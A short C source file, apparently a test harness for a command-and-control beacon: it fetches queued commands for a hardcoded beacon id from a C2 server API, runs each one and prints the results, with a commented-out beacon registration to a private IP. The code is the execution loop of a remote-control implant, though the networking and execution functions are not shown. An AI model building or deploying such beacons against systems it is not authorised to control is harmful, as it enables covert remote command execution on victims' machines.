#include "c2api.h"
#include "c2json.h"
#include <stdio.h>
#include "c2types.h"

int main(int argc, char* argv[])
{
    /*int id = register_beacon("192.168.100.1", "c2-beacon-test1");*/
    /*struct Command** commands = get_beacon_commands(id, true);*/
    struct Command** commands = get_beacon_commands(1743136869, true);

    for (int i = 0; commands[i] != NULL; i++) {
        run_command(commands[i]);
        printf("%s\n", commands[i]->result);
    }

    return 0;
}
